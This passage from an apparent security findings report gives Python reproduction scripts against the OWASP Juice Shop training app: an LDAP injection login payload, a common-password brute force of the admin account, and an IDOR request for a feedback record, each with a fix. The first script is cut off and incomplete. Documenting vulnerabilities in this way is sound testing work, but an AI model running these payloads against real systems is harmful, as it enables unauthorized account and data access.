```python
import requests
import sys

login_url = f"{target}/rest/user/login"
payload = {'email': '*)(uid=*))(|(mail=*', 'password': 'anything'}
response = requests.post(login_url, json=payload)
if response.status_code == 200:
    print('W-044 reproduced: LDAP Injection successful')
else:

```

**Fix.** Sanitize special LDAP characters in user-provided inputs used in directory searches.

### W-045 — reproduction

Performs basic brute-force attacks on login endpoint using simple password guesses.

```python
import requests
import sys

target = sys.argv[1]
login_url = f"{target}/rest/user/login"
count = 0
common_passwords = ['password', '123456', 'qwerty']
for pwd in common_passwords:
    payload = {'email': 'admin@juice-sh.op', 'password': pwd}
    resp = requests.post(login_url, json=payload)
    count += 1
    if resp.status_code == 200 or count >= len(common_passwords):
        break
if resp.status_code == 200:
    print('W-045 reproduced: Login brute force may succeed with simple passwords')
else:
    print('W-045 not reproduced')
```

**Fix.** Implement account lockout policies and CAPTCHA after failed attempts.

### W-050 — reproduction

Accesses specific feedback resource directly by ID bypassing intended access restrictions.

```python
import requests
import sys

target = sys.argv[1]
feedback_url = f"{target}/api/Feedbacks/1"
response = requests.get(feedback_url)
if response.status_code == 200 and '_id' in response.json():
    print('W-050 reproduced: Unauthorized feedback record access (IDOR)')
else:
    print('W-050 not reproduced')
```

**Fix.** Ensure object-level permissions are enforced when retrieving resources by ID.
